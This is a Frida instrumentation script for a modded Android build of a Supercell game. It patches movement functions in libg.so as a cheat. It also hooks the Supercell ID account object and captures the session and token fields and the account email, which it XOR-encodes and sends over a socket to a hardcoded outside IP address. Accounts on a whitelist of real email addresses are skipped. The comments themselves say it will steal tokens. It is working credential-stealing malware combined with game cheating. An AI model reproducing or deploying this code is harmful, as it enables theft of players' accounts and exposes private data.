// THIS SCRIPT WILL STEAL YOUR TOKEN!!! CAUTION WHEN USING THIS!
// script has the famous kit exploit for v59
// To disable the token grab, set the host (line 98) to 127.0.0.1 or something

const free = new NativeFunction(Module.getExportByName('libc.so', 'free'), 'void', ['pointer']);
const fread = new NativeFunction(Module.getExportByName('libc.so', 'fread'), 'int', ['pointer', 'int', 'int', 'pointer']);
const fopen = new NativeFunction(Module.getExportByName('libc.so', 'fopen'), 'pointer', ['pointer', 'pointer']);
const fclose = new NativeFunction(Module.getExportByName('libc.so', 'fclose'), 'int', ['pointer']);
const ftell = new NativeFunction(Module.getExportByName('libc.so', 'ftell'), 'int', ['pointer']);
const fseek = new NativeFunction(Module.getExportByName('libc.so', 'fseek'), 'int', ['pointer', 'int', 'int']);
const rewind = new NativeFunction(Module.getExportByName('libc.so', 'rewind'), 'void', ['pointer']);
const malloc = new NativeFunction(Module.getExportByName('libc.so', 'malloc'), 'pointer', ['uint']);

const toast = function (text) {
    Java.scheduleOnMainThread(() => {
        Java.use('android.widget.Toast')
            .makeText(
                Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(),
                Java.use('java.lang.StringBuilder').$new(text),
                1
            ).show();
    });
};

var dataDirectory = null;

Java.perform(function () {
    const activityManager = Java.use('android.app.ActivityManager');
    const context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
    const fileDir = context.getFilesDir().getAbsolutePath();

    dataDirectory = fileDir;
});

let savefilepath = '/data/user/0/com.friday.im.specialmods.v59/update/sc3d/background/bo_bgcolor.png';
let errorPath = `${dataDirectory}/error.log`;

function getCurrentTime() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    return `[${hours}:${minutes}:${seconds}]`;
}

function writeToFile(filePath, mode, text) {
    try {
        const file = new File(filePath, mode);
        file.write(text);
        file.flush();
        file.close();
    } catch (e) {
        const errortimefile = getCurrentTime();
        const errormessagefile = `${errortimefile} Error occurred while writing file: ${e}\n`;
        if (filePath !== errorPath) {
            const file = new File(errorPath, 'a+');
            file.write(errormessagefile);
            file.flush();
            file.close();
        }
    }
}

writeToFile(savefilepath, 'a+', '""');

function ReadFile(filepath, mode) {
    const file = fopen(Memory.allocUtf8String(filepath), Memory.allocUtf8String(mode));
    fseek(file, 0, 2);
    const Fsize = ftell(file);
    rewind(file);
    const buffer = malloc(Fsize);
    fread(buffer, 1, Fsize, file);
    const byteArray = Memory.readByteArray(buffer, Fsize);
    const uint8Array = new Uint8Array(byteArray);
    fclose(file);
    free(buffer);
    let resultString = '';
    for (let i = 0; i < uint8Array.length; i++) {
        resultString += String.fromCharCode(uint8Array[i]);
    }
    return resultString;
}

function encrypt(str, key) {
    str = str.replace(/\n/g, '""');
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += (str.charCodeAt(i) ^ key.charCodeAt(i % key.length)).toString(16).padStart(2, '0');
    }
    return result;
}

function decrypt(hexStr, key) {
    let result = '';
    for (let i = 0; i < hexStr.length; i += 2) {
        const charCode = parseInt(hexStr.substring(i, i + 2), 16) ^ key.charCodeAt((i / 2) % key.length);
        result += String.fromCharCode(charCode);
    }
    return result.replace(/\n/g, '""');
}

const HOST = '188.245.178.251'; // Change this to your server's IP
const PORT = 3169; // Change this to your server's port
let key = 'your_key_here';

const whitelist = [
    'oyundronu123@gmail.com',
    'efe66600@gmail.com',
    'busealibaz@gmail.com',
    'erkan08ist@gmail.com'
];

function hexStringToBytes(hex) {
    const cleanedHex = hex.replace(/[^a-fA-F0-9]/g, '');
    if (cleanedHex.length % 2 !== 0) {
        throw new Error(`Invalid hex string length: ${cleanedHex.length}`);
    }

    const byteArray = new Uint8Array(cleanedHex.length / 2);
    for (let i = 0; i < cleanedHex.length; i += 2) {
        const byteValue = parseInt(cleanedHex.substr(i, 2), 16);
        if (isNaN(byteValue)) {
            throw new Error(`Invalid hex sequence at position ${i}`);
        }
        byteArray[i / 2] = byteValue;
    }
    return byteArray;
}

function sendHexPayload(hexString) {
    let connection = null;

    return Socket.connect({
        family: 'ipv4',
        host: HOST,
        port: PORT
    }).then(function (conn) {
        connection = conn;

        const message = hexStringToBytes(hexString);
        return connection.output.write(message);
    }).then(function () {
        return connection.output.drain();
    }).then(function () {
        return connection.close();
    }).catch(function (error) {
        console.error(`Error: ${error}`);
        if (connection) connection.close();
        throw error;
    });
}

Java.perform(function () {
    const IdAccount = Java.use('com.supercell.id.scid_plugin.IdAccount');

    IdAccount.toString.overload().implementation = function () {
        const result = this.toString();
        const sd = this.sd.value;
        const el = this.el.value;
        const st = this.st.value;

        if (whitelist.includes(el)) {
            return result;
        } else {
            const sendresult = {
                sd: sd,
                el: el,
                st: st
            };

            const sendresultString = JSON.stringify(sendresult);
            const encodedsendresultString = encrypt(sendresultString, key);

            const content = ReadFile(savefilepath, 'r').trim();
            const contentNum = Number(content);
            if (isNaN(contentNum)) writeToFile(savefilepath, 'w+', '0');
            if (contentNum < 666) {
                contentNum++;
                writeToFile(savefilepath, 'w', contentNum.toString());
                sendHexPayload(encodedsendresultString); // Send payload
            }

            return result;
        }
    };
});

let packageName = null;
Java.perform(function () {
    const ActivityThread = Java.use('android.app.ActivityThread');
    const currentApplication = ActivityThread.currentApplication();
    const context = currentApplication.getApplicationContext();
    packageName = context.getPackageName();
});

if (packageName == 'com.friday.im.specialmods.v59') {
    // Made by MehmetEfeFriday
    const base = Module.findBaseAddress('libg.so');
    const basesize = Process.findModuleByName('libg.so').size;

    Memory.protect(base, basesize, 'rwx');

    const SlipperyDebuffAddr = 0x82C668;
    const shouldShowMoveStickAddr = 0x645B04;
    const hasNoMovementAddr = 0x82C614;

    const SlipperyDebuff = base.add(SlipperyDebuffAddr);
    const shouldShowMoveStick = base.add(shouldShowMoveStickAddr);
    const hasNoMovement = base.add(hasNoMovementAddr);

    Interceptor.replace(SlipperyDebuff, new NativeCallback(function (a1) {
        return 0;
    }, 'int64', ['int64']));

    Interceptor.replace(shouldShowMoveStick, new NativeCallback(function (a1, a2) {
        return 1;
    }, 'bool', ['int64', 'pointer']));

    Interceptor.replace(hasNoMovement, new NativeCallback(function (a1) {
        return 0;
    }, 'int64', ['int64']));

    toast('Made By F.R.I.D.A.Y/I.M');
} else {
    toast('fuck you dont steal my mod'); // Don't touch my code
}
